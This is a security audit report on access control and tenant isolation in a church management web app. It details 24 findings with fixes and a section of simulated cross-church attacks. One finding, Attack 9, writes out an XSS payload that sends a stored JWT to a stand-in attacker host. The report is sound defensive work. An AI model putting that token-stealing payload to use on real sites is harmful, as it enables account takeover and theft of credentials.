# RBAC Security Audit Report — Shalom Church Project

**Date**: June 2025  
**Auditor Scope**: Senior Security Engineer, Backend Architect, Product Auditor  
**Application**: Shalom Church Management SaaS (Express 5 + React 19 + PostgreSQL 17)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Architecture Overview](#architecture-overview)
3. [Section 1 — Permission Boundary Checks](#section-1--permission-boundary-checks)
4. [Section 2 — Feature Access Validation](#section-2--feature-access-validation)
5. [Section 3 — Missed / Mixed Permissions](#section-3--missed--mixed-permissions)
6. [Section 4 — Backend Endpoint Security](#section-4--backend-endpoint-security)
7. [Section 5 — Frontend vs Backend Mismatch](#section-5--frontend-vs-backend-mismatch)
8. [Section 6 — Data Leakage Risks](#section-6--data-leakage-risks)
9. [Section 7 — Edge Case / Attack Simulation](#section-7--edge-case--attack-simulation)
10. [All Findings Summary Table](#all-findings-summary-table)
11. [Final Verdict](#final-verdict)

---

## Executive Summary

The application's **route-level multi-tenant isolation** is strong — the `resolveScopedChurchId` pattern consistently prevents Church Admin A from passing Church B's `church_id` in API requests. Cross-church attacks at the route layer are blocked.

However, the **service layer has critical gaps**: 7 service functions accept `churchId` as optional or omit it entirely, meaning the database queries run **unscoped across all churches** when `churchId` is empty. While route handlers currently pass `churchId` correctly, this creates a fragile "defense by convention" model — any future route that omits the parameter breaks tenant isolation.

Financial services (`paymentAdminService`, `subscriptionService`) are the most concerning: manual payments, refunds, subscription modifications, and payment history lookups have **zero church_id filtering** at the service layer.

The frontend has one high-severity finding (JWT in localStorage) and several defense-in-depth gaps where admin UI renders without role checks, relying solely on a single route guard.

---

## Architecture Overview

| Layer | Technology | Auth Model |
|-------|-----------|------------|
| Frontend | React 19 + Vite 8 + Tailwind | JWT in localStorage + httpOnly refresh cookie |
| Backend | Express 5.x + TypeScript | JWT (15m access + 30d refresh) via Bearer header |
| Database | PostgreSQL 17 (AWS RDS) | RLS enabled but bypassed by `supabaseAdmin` (pg Pool) |
| Roles | `member`, `admin`, super-admin (env-based) | Two-tier: DB role + env-based super-admin allowlist |

**Auth chain**: `requireAuth` → `requireRegisteredUser` → `requireSuperAdmin` (optional)  
**Tenant isolation**: `resolveScopedChurchId(req, clientChurchId)` — forces `req.user.church_id` for non-super-admins  
**Super admin**: Identified by hardcoded `SUPER_ADMIN_EMAILS` / `SUPER_ADMIN_PHONES` env vars, checked via `isSuperAdminEmail(email, phone)`

---

## Section 1 — Permission Boundary Checks

> Do Church Admins stay strictly within their own church? Can Super Admins access everything?

### FINDING AUTH-1 — MEDIUM: 60-second role cache allows stale privilege after demotion
- **What's wrong**: `requireAuth` caches the DB lookup (role, church_id) for 60 seconds. After an admin is demoted to member, they retain admin access for up to 60s.
- **Why dangerous**: A demoted admin can perform destructive operations (delete members, modify subscriptions) during the cache window. For payment-sensitive operations, this is a TOCTOU (time-of-check, time-of-use) vulnerability.
- **Affected roles**: Demoted admins, users whose `church_id` changes
- **Severity**: MEDIUM
- **Fix**: Implement cache invalidation on role/church_id changes. When `updateAdminById` or `revokeAdminAccess` is called, invalidate the target user's cache entry. Alternatively, reduce cache TTL to 5-10 seconds for write operations.

### FINDING AUTH-2 — MEDIUM: Deleted user fallback to JWT claims
- **What's wrong**: When a user is deleted from the DB but their JWT is still valid (up to 15 minutes), `requireAuth` falls back to JWT claims instead of returning 401.
- **Why dangerous**: A deleted/banned user retains API access with whatever role their JWT contains. The JWT itself carries `email` and `phone` claims which are used for super-admin checks.
- **Affected roles**: Banned/deleted users
- **Severity**: MEDIUM
- **Fix**: When the DB lookup returns no row, return `401 Unauthorized` immediately. Do not fall back to JWT claims.

### FINDING AUTH-3 — MEDIUM: Double role lookup inconsistency
- **What's wrong**: `requireAuth` looks up the user in `auth_users` (with 60s cache). Then `requireRegisteredUser` does a second lookup in the `users` table and **overwrites** `req.user.role` and `req.user.church_id`. If these tables contain different values (e.g., during migration or race condition), the user's role oscillates between middleware.
- **Why dangerous**: A user could pass `requireAuth` with role `member` but then get overwritten to `admin` by `requireRegisteredUser`, or vice versa. This creates an unpredictable auth state.
- **Affected roles**: All roles
- **Severity**: MEDIUM
- **Fix**: Use a single source of truth for role/church_id. Either remove the double lookup or ensure both tables are always in sync with a DB trigger.

### FINDING AUTH-4 — HIGH: Super-admin identity relies on JWT email/phone claims
- **What's wrong**: `requireSuperAdmin` checks `isSuperAdminEmail(req.user.email, req.user.phone)`. The `email` and `phone` values originate from JWT claims, which are set at token issuance time. If the JWT signing key is compromised, an attacker can forge a token with a super-admin email.
- **Why dangerous**: Super-admin has unrestricted global access — all churches, all data, all operations. Compromise of the symmetric HMAC key (a single env var) grants total system control.
- **Affected roles**: Super Admin
- **Severity**: HIGH
- **Fix**: (1) Add a DB-backed `is_super_admin` flag checked at runtime, not just JWT claims. (2) Consider asymmetric JWT signing (RS256) where the private key is in a secrets manager. (3) Add IP allowlist or MFA for super-admin operations.

### FINDING AUTH-5 — HIGH: RLS permissive by default on empty churchId
- **What's wrong**: `rlsContext.ts` sets `app.current_church_id` to `""` (empty string) when no church context exists. The RLS policies use `current_setting('app.current_church_id', true)` which returns `""` — and unless policies explicitly check for empty string, this grants **unrestricted access**.
- **Why dangerous**: Any code path that runs without setting the RLS context (unauthenticated routes, cron jobs, background tasks) operates with no tenant filter at the database level.
- **Affected roles**: All / system-level
- **Severity**: HIGH
- **Fix**: (1) Change the default to a sentinel value like `'__NONE__'` that matches no church. (2) Add explicit RLS policy conditions: `WHERE church_id = current_setting('app.current_church_id') AND current_setting('app.current_church_id') != ''`.

---

## Section 2 — Feature Access Validation

> Is every feature properly gated to the correct role?

### FINDING FEAT-1 — HIGH: `GET /churches/summary` — no admin role check
- **What's wrong**: Any registered member can call this endpoint and receive church statistics including **member counts and income figures** for their church. There is no `role === "admin"` check.
- **Why dangerous**: Regular members see financial data intended only for church administrators.
- **Affected roles**: Regular members
- **Severity**: HIGH
- **Fix**: Add inline role check: `if (req.user.role !== "admin" && !isSuperAdminEmail(req.user.email, req.user.phone)) return res.status(403).json({ error: "Admin access required" });`

### FINDING FEAT-2 — MEDIUM: `POST /assign` (leadership) doesn't validate member_id belongs to target church
- **What's wrong**: When assigning a leadership role, the route accepts a `member_id` from the request body and validates it's a UUID, but **does not verify** the member belongs to `targetChurchId`. A church admin could assign a leadership role referencing a member from another church.
- **Why dangerous**: Cross-church data reference. The leadership record is scoped to the admin's church, but the `member_id` foreign key points to a member in another church — breaking referential integrity of the tenant model.
- **Affected roles**: Church Admin
- **Severity**: MEDIUM
- **Fix**: Before inserting, query `members` to verify `member_id` belongs to `targetChurchId`.

### FINDING FEAT-3 — MEDIUM: Subscription status values not validated
- **What's wrong**: `PATCH /ops/subscriptions/:subId` allows admins to set `status: req.body.status` without validating against an enum. An admin could set invalid states like `"hacked"` or `"active"` on a cancelled subscription.
- **Why dangerous**: Database integrity violation. Invalid status values could break billing logic, reconciliation cron jobs, and dashboard reporting.
- **Affected roles**: Church Admin
- **Severity**: MEDIUM
- **Fix**: Add status enum validation: `const ALLOWED = ["active", "paused", "cancelled", "pending_first_payment", "overdue"]; if (!ALLOWED.includes(status)) return res.status(400)...`

---

## Section 3 — Missed / Mixed Permissions

> Are there endpoints with no role check, or inconsistent role checking patterns?

### FINDING MIX-1 — CRITICAL: Service layer optional `churchId` pattern
- **What's wrong**: 7 critical service functions accept `churchId` as optional. When omitted, queries run **unscoped across all churches**:
  - `getMemberById(memberId, churchId?)` — reads any member
  - `updateMember(memberId, churchId?, input)` — updates any member
  - `deleteMember(memberId, churchId?)` — deletes any member
  - `restoreMember(memberId)` — no churchId at all
  - `getMemberDeleteImpact(memberId, churchId?)` — leaks cross-church info
  - `listRefundRequests(churchId?)` — returns all refund requests with financial details
  - `listAdmins(churchId?)` / `searchAdmins({churchId?})` — exposes admin emails globally
- **Why dangerous**: While current route handlers pass `churchId` correctly, this is "defense by convention" — one missed parameter in any future route creates a cross-church breach. The service layer should be the **last line of defense**, not a pass-through.
- **Affected roles**: Any role if a route handler omits churchId
- **Severity**: CRITICAL
- **Fix**: Make `churchId` required (non-optional) in all service functions that query tenant-scoped data. Throw an error if it's empty/undefined.

### FINDING MIX-2 — CRITICAL: Financial services have ZERO church scoping
- **What's wrong**: The entire `paymentAdminService.ts` has no `churchId` filtering:
  - `recordManualPayment(input)` — records payments for any member by ID
  - `recordRefund(input)` — refunds any payment by ID
  - `getMemberPaymentHistory(memberId)` — reads any member's payment history
  - `updateSubscription(subscriptionId, input)` — modifies any subscription
- **Why dangerous**: These are the highest-value operations in the system (financial data). An admin of Church A who can supply a `member_id` or `payment_id` from Church B can read, create, and modify Church B's financial records. Currently blocked at the route layer via `member.church_id !== req.user.church_id` checks, but the service layer provides no safety net.
- **Affected roles**: Church Admin (if route check fails)
- **Severity**: CRITICAL
- **Fix**: Add mandatory `churchId` parameter to all `paymentAdminService` functions. In `recordManualPayment`, add `.eq("church_id", churchId)` to the member lookup. In `recordRefund`, join payment→member→church_id and validate. Same for all others.

### FINDING MIX-3 — HIGH: `reviewRefundRequest` lacks church scoping
- **What's wrong**: Unlike `reviewMembershipRequest`, `reviewCancellationRequest`, and `reviewFamilyMemberCreateRequest` — which all accept a `callerChurchId` parameter and validate the request belongs to the caller's church — `reviewRefundRequest` has **no such parameter**. Any admin who knows the refund request ID can approve/reject it.
- **Why dangerous**: Cross-church refund approval. An admin could approve large refunds for another church's members.
- **Affected roles**: Church Admin
- **Severity**: HIGH
- **Fix**: Add `callerChurchId` parameter to `reviewRefundRequest` and validate `refundRequest.church_id === callerChurchId`.

### FINDING MIX-4 — HIGH: Admin CRUD services are globally scoped
- **What's wrong**: `getAdminById(adminId)`, `updateAdminById(adminId, input)`, and `removeAdminById(adminId)` have **no church_id parameter**. They operate on any admin globally. Currently these routes use `requireSuperAdmin`, but the service functions themselves provide no tenant isolation.
- **Why dangerous**: If any route ever calls these functions outside the `requireSuperAdmin` gate, cross-church admin manipulation becomes possible.
- **Affected roles**: Any role (if middleware bypassed)
- **Severity**: HIGH
- **Fix**: Add `churchId` parameter to all admin CRUD service functions.

### FINDING MIX-5 — MEDIUM: `preRegisterMember` can hijack existing users
- **What's wrong**: The function looks up a user by email globally. If found, it **overwrites** their `church_id` and `role`, effectively moving them from Church A to Church B without their consent.
- **Why dangerous**: Admin of Church B can steal a Church A user by pre-registering them with the same email. The user's `church_id` changes silently.
- **Affected roles**: Church Admin
- **Severity**: MEDIUM
- **Fix**: If the user already exists with a different `church_id`, reject the pre-registration with an error: "This user already belongs to another church."

---

## Section 4 — Backend Endpoint Security

> Are all endpoints properly protected with role validation and church_id filtering?

### Route Authentication Coverage

| Route Group | `requireAuth` | `requireRegisteredUser` | `requireActiveChurch` | Admin Check |
|---|---|---|---|---|
| `/api/members` | ✅ | ✅ | ✅ | Per-route |
| `/api/churches` | ✅ | ✅ | ❌ | Per-route / `requireSuperAdmin` |
| `/api/admins` | ✅ | ✅ | ❌ | `requireSuperAdmin` / per-route |
| `/api/payments` | ✅ | ✅ | ✅ | None (member-facing) |
| `/api/subscriptions` | ✅ | ✅ | ✅ | Per-route |
| `/api/engagement` | ✅ | ✅ | ✅ | Per-route |
| `/api/requests` | ✅ | ✅ | ✅ | Per-route |
| `/api/pastors` | ✅ | ✅ | ✅ | Per-route |
| `/api/ops` | ✅ | ✅ | ✅ | Per-route |
| `/api/leadership` | ✅ | ✅ | ✅ | Per-route |
| `/api/saas` | ✅ | ✅ | ❌ | `requireSuperAdmin` |
| `/api/otp` | ❌ Public | ❌ | ❌ | None |
| `/api/webhooks` | ❌ Public | ❌ | ❌ | Signature verify |

### FINDING BE-1 — HIGH: `POST /members/:id/relink-auth` — cross-church member-to-user linking
- **What's wrong**: This super-admin-only endpoint links any member to any user email. There is **no validation** that the member and target user belong to the same church.
- **Why dangerous**: A compromised super-admin (or the 60s cache window after super-admin status revocation) could link Church A's member record to a Church B user, giving that user access to Church A's data.
- **Affected roles**: Super Admin
- **Severity**: HIGH
- **Fix**: Verify the target user's `church_id` matches the member's `church_id` before linking.

### FINDING BE-2 — MEDIUM: No self-deletion or last-admin guard on admin delete
- **What's wrong**: `DELETE /admins/id/:id` allows a super-admin to delete themselves or the last admin of a church, leaving it unmanageable.
- **Why dangerous**: An accidental self-deletion removes the super admin from the system. Deleting the last admin of a church makes it inaccessible.
- **Affected roles**: Super Admin
- **Severity**: MEDIUM
- **Fix**: (1) Block deleting the currently authenticated admin. (2) Before deleting, check if there are other admins for that church.

### FINDING BE-3 — LOW: Public donation endpoints lack rate limiting
- **What's wrong**: `/api/payments/public/donation/order` and `/api/payments/public/donation/verify` require no authentication or rate limiting. An attacker could create millions of Razorpay orders.
- **Why dangerous**: Resource exhaustion on the Razorpay account, potential billing impact, and abuse of the donation flow.
- **Affected roles**: Anonymous
- **Severity**: LOW
- **Fix**: Add rate limiting (e.g., 10 requests/minute per IP) to public endpoints.

### FINDING BE-4 — LOW: Membership request endpoint lacks rate limiting
- **What's wrong**: `POST /requests/membership-requests` only requires `requireAuth` (no `requireRegisteredUser`). An authenticated but unregistered user could submit unlimited membership requests.
- **Why dangerous**: Spam/DoS of the membership request queue for churches.
- **Affected roles**: Authenticated unregistered users
- **Severity**: LOW
- **Fix**: Add deduplication check (same email + church_code) and rate limiting.

---

## Section 5 — Frontend vs Backend Mismatch

> Are there actions the UI allows that the backend rejects, or vice versa?

### FINDING FBM-1 — HIGH: JWT access token stored in localStorage
- **What's wrong**: Both `shalom_custom_auth` and `shalom_session` objects (containing the JWT access token) are stored in `localStorage`. Any XSS vulnerability allows token theft.
- **Why dangerous**: XSS → full account takeover. The access token can be used directly with `Bearer` auth to call any API endpoint as the victim, including super-admin operations.
- **Affected roles**: All roles (especially super admin)
- **Severity**: HIGH
- **Fix**: Store access tokens in memory only (React state). Use the httpOnly refresh cookie to re-acquire tokens on page reload. Consider making the access token itself an httpOnly cookie.

### FINDING FBM-2 — MEDIUM: PastorsTab renders without role guard in content area
- **What's wrong**: In `AdminConsolePage.tsx`, the PastorsTab content renders as `{activeAdminTab === "pastors" ? <PastorsTab /> : null}` — without `&& isAdminUser`. Other tabs like MembersTab correctly use `&& isAdminUser`.
- **Why dangerous**: If the route guard on `/admin-tools` is ever removed or bypassed, PastorsTab (which includes create/edit/delete/transfer actions) becomes accessible to members. Defense-in-depth gap.
- **Affected roles**: Member (if route guard bypassed)
- **Severity**: MEDIUM
- **Fix**: Change to `{activeAdminTab === "pastors" && isAdminUser ? ... : null}`

### FINDING FBM-3 — LOW: Member tab list includes admin-only tabs
- **What's wrong**: The member tab list is `["pre-register", "activity"]`. Both tabs call admin-only endpoints that return 403 for members. The member sees forms/tables that don't work.
- **Why dangerous**: API endpoint paths and admin feature structure leaked. Bad UX with confusing 403 errors.
- **Affected roles**: Members who reach AdminConsolePage
- **Severity**: LOW
- **Fix**: Set member tab list to `[]` (empty), or remove `isMemberOnlyUser` tab list entirely since members can't reach the page.

### FINDING FBM-4 — MEDIUM: Client-side role state is mutable via DevTools
- **What's wrong**: `isSuperAdmin` and `isAdminUser` are derived from `authContext` React state. An attacker can modify this state via React DevTools to reveal all admin UI (tabs, buttons, API endpoint paths).
- **Why dangerous**: While backend APIs reject unauthorized calls, the entire admin UI structure, field names, and endpoint URLs become visible. This aids reconnaissance for targeted API attacks.
- **Affected roles**: Any authenticated user with DevTools
- **Severity**: MEDIUM
- **Fix**: This is inherent to SPAs. Mitigate by (1) code-splitting admin bundles behind a server-side role check, (2) ensuring the exposed admin UI provides no useful attack surface beyond what's already documented.

---

## Section 6 — Data Leakage Risks

> Can data from one church leak to another through any vector?

### FINDING LEAK-1 — CRITICAL: `paymentAdminService` functions return cross-church financial data
- **What's wrong**: `getMemberPaymentHistory(memberId)` returns full payment records (amounts, dates, methods, transaction IDs) for any member ID without church filtering. `listRefundRequests()` without `churchId` returns all refund requests with member names, emails, amounts, and payment methods embedded via joins.
- **Why dangerous**: Direct exposure of financial PII across tenants. Violates data protection regulations.
- **Affected roles**: Any admin if route layer fails to scope
- **Severity**: CRITICAL
- **Fix**: Make `churchId` mandatory in all service functions. Add `.eq("church_id", churchId)` or join-based church validation.

### FINDING LEAK-2 — HIGH: `listAdmins` / `searchAdmins` leak admin emails across churches
- **What's wrong**: When called without `churchId`, these return admin records from all churches including names, emails, phones, and roles. The route layer passes `churchId` for non-super-admins, but the service provides no guardrail.
- **Why dangerous**: Admin email enumeration enables targeted phishing. Admin phone numbers enable social engineering attacks.
- **Affected roles**: Any admin if route layer fails to scope
- **Severity**: HIGH
- **Fix**: Make `churchId` required, throw if empty.

### FINDING LEAK-3 — MEDIUM: Auto-linking in `requireRegisteredUser` can surface pre-existing profiles
- **What's wrong**: When a user authenticates for the first time and their email/phone matches a pre-registered profile, `requireRegisteredUser` auto-links them. The first person to authenticate with that email/phone claims the profile.
- **Why dangerous**: If an admin pre-registers "john@church.com" and a different person authenticates with that email first, they inherit the pre-registered role and church_id. This is a race condition in the identity binding model.
- **Affected roles**: Pre-registered users
- **Severity**: MEDIUM
- **Fix**: Require explicit identity verification (e.g., OTP to the email/phone) before auto-linking.

---

## Section 7 — Edge Case / Attack Simulation

### Attack 1: Church A admin enumerates Church B member IDs via GET /members/:id
**Result**: **BLOCKED** — `resolveScopedChurchId` forces `req.user.church_id` for non-super-admins. The service's `getMemberById(id, churchId)` would only return members matching the admin's church.

### Attack 2: Church A admin modifies Church B subscription via PATCH /ops/subscriptions/:subId
**Result**: **BLOCKED** — Route handler verifies `member.church_id === req.user.church_id` via subscription→member chain lookup.

### Attack 3: Church A admin deletes Church B events via DELETE /engagement/events/:id
**Result**: **BLOCKED** — Service uses `.eq("id", eventId).eq("church_id", churchId)` compound filter.

### Attack 4: Church A admin creates payment for Church B member via POST /ops/payments/manual
**Result**: **BLOCKED at route layer** — Route handler checks `member.church_id === req.user.church_id`. But **NOT blocked at service layer** — `recordManualPayment` has no church_id filter.

### Attack 5: Church A admin approves Church B refund request via POST /refund-requests/:id/review
**Result**: **PARTIALLY BLOCKED** — Route uses `requireSuperAdmin`, but `reviewRefundRequest` service has no `callerChurchId` validation. If the route guard is changed, this becomes exploitable.

### Attack 6: Member views church financial stats via GET /churches/summary
**Result**: **NOT BLOCKED** — No role check. Member can see income totals, member counts, and other statistics.

### Attack 7: Admin pre-registers user from another church via POST /admins/pre-register-member
**Result**: **NOT BLOCKED at service layer** — `preRegisterMember` updates the existing user's `church_id` to the caller's church, silently hijacking them. Route does have cross-church check for explicit `church_id`, but the email-lookup-and-overwrite pattern is dangerous.

### Attack 8: Demoted admin performs destructive operations during 60s cache window
**Result**: **NOT BLOCKED** — 60s cache TTL in `requireAuth` allows stale role to persist. Demoted admin retains all previous permissions until cache expires.

### Attack 9: XSS steals super-admin JWT from localStorage
**Result**: **NOT BLOCKED** — Any XSS injects `fetch("https://evil.com?t="+localStorage.getItem("shalom_custom_auth"))`, granting full super-admin API access for 15 minutes (token lifetime).

### Attack 10: Admin assigns leadership role with member_id from another church
**Result**: **NOT BLOCKED** — Leadership assignment validates UUID format but not church membership. The leadership record is created with the correct `church_id`, but the `member_id` references a cross-church member.

---

## All Findings Summary Table

| ID | Severity | Category | Title |
|----|----------|----------|-------|
| MIX-1 | **CRITICAL** | Service Layer | 7 service functions accept optional `churchId` — queries run unscoped |
| MIX-2 | **CRITICAL** | Service Layer | `paymentAdminService` has zero church_id filtering on all 4 functions |
| LEAK-1 | **CRITICAL** | Data Leakage | Payment/refund services return cross-church financial data |
| AUTH-4 | **HIGH** | Auth | Super-admin identity relies solely on JWT email/phone claims |
| AUTH-5 | **HIGH** | Auth | RLS permissive by default on empty `churchId` (empty string = no filter) |
| FEAT-1 | **HIGH** | Feature Access | `GET /churches/summary` — any member can see income/stats |
| MIX-3 | **HIGH** | Permissions | `reviewRefundRequest` has no church scoping (unlike all other review functions) |
| MIX-4 | **HIGH** | Permissions | Admin CRUD services (`getAdminById`, `updateAdminById`, `removeAdminById`) globally scoped |
| BE-1 | **HIGH** | Backend | `relink-auth` allows cross-church member-to-user linking |
| FBM-1 | **HIGH** | Frontend | JWT access token stored in localStorage (XSS → account takeover) |
| LEAK-2 | **HIGH** | Data Leakage | `listAdmins`/`searchAdmins` leak admin emails/phones across churches |
| AUTH-1 | MEDIUM | Auth | 60-second role cache allows operations after demotion |
| AUTH-2 | MEDIUM | Auth | Deleted user falls back to JWT claims for 15 minutes |
| AUTH-3 | MEDIUM | Auth | Double role lookup inconsistency between middleware layers |
| FEAT-2 | MEDIUM | Feature Access | Leadership assignment doesn't validate `member_id` church ownership |
| FEAT-3 | MEDIUM | Feature Access | Subscription status not validated against enum |
| MIX-5 | MEDIUM | Permissions | `preRegisterMember` silently hijacks users from other churches |
| BE-2 | MEDIUM | Backend | No self-deletion or last-admin guard on admin delete |
| FBM-2 | MEDIUM | Frontend | `PastorsTab` renders without `isAdminUser` content guard |
| FBM-4 | MEDIUM | Frontend | Client-side role state mutable via DevTools (admin UI leak) |
| LEAK-3 | MEDIUM | Data Leakage | Auto-linking profiles grants first-to-authenticate ownership |
| BE-3 | LOW | Backend | Public donation endpoints lack rate limiting |
| BE-4 | LOW | Backend | Membership request spam (no rate limit / dedup) |
| FBM-3 | LOW | Frontend | Member tab list includes admin-only tabs (UX leak) |

**Total: 24 findings** — 3 Critical, 8 High, 10 Medium, 3 Low

---

## Final Verdict

### Overall Security Score: 5.5 / 10

**Strengths:**
- Route-level tenant isolation via `resolveScopedChurchId` is consistently applied and effective against direct cross-church attacks
- Payment verification always cross-checks amounts with Razorpay (never trusts client-supplied amounts)
- All request review functions (except refund) properly validate `callerChurchId`
- Route guards on sensitive endpoints (`requireSuperAdmin`) are correctly placed
- CSRF is a non-issue due to Bearer token auth pattern

**Weaknesses:**
- Service layer is a "paper wall" — tenant isolation depends entirely on route handlers passing the right `churchId`. One missed parameter = cross-church breach.
- Financial services (`paymentAdminService`) are the most exposed: zero church scoping on critical money operations
- Super-admin model is fragile: single-factor (JWT email claim), no MFA, symmetric key
- JWT in localStorage makes every XSS a full account takeover, including super-admin

### Top 5 Critical Fixes (Priority Order)

#### 1. Make `churchId` mandatory in all tenant-scoped service functions
**Impact**: Closes the entire class of "optional church_id" vulnerabilities (MIX-1, MIX-2, LEAK-1, LEAK-2)  
**Effort**: Medium  
**Action**: In every service function that queries tenant-scoped tables, change `churchId?` to `churchId: string` and add validation: `if (!churchId) throw new Error("churchId is required")`. Focus on `paymentAdminService` and `memberService` first.

#### 2. Add church_id filtering to `paymentAdminService`
**Impact**: Closes the most dangerous financial data exposure (MIX-2, LEAK-1)  
**Effort**: Medium  
**Action**: Add `.eq("church_id", churchId)` to member lookups in `recordManualPayment`, add join-based church validation in `recordRefund`, add `churchId` parameter to `updateSubscription` and `getMemberPaymentHistory`. Accept `churchId` as a mandatory parameter in all functions.

#### 3. Move JWT access token from localStorage to memory-only
**Impact**: Eliminates XSS → account takeover vector (FBM-1)  
**Effort**: Medium-High  
**Action**: Store access token in a React ref or closure, not localStorage. On page reload, use the httpOnly refresh cookie to obtain a new access token via `/api/auth/refresh`. Remove all `localStorage.setItem/getItem` calls for tokens.

#### 4. Add `callerChurchId` check to `reviewRefundRequest`
**Impact**: Closes cross-church refund approval (MIX-3)  
**Effort**: Low  
**Action**: Add a `callerChurchId` parameter, fetch the refund request, validate `request.church_id === callerChurchId`. Follow the exact pattern used in `reviewMembershipRequest`.

#### 5. Add admin role check to `GET /churches/summary`
**Impact**: Prevents member access to financial statistics (FEAT-1)  
**Effort**: Low  
**Action**: Add `if (req.user.role !== "admin" && !isSuperAdminEmail(req.user.email, req.user.phone)) return res.status(403)...` at the top of the handler.

### Areas Needing Architectural Redesign

1. **Service-layer trust model**: Current architecture trusts route handlers to always pass correct `churchId`. This should be inverted — services should enforce tenant isolation independently, making it impossible to query cross-church data even if a route handler is buggy.

2. **Super-admin authentication**: Environment-variable-based super-admin identity with symmetric JWT is a single point of compromise. Consider a DB-backed admin role with MFA requirement for super-admin operations.

3. **Token storage strategy**: The split between httpOnly refresh cookie (good) and localStorage access token (bad) needs to be unified. Either make both cookies (httpOnly) or use a token-in-memory pattern with silent refresh.

---

*End of audit report. All findings are based on static code analysis of the current codebase.*
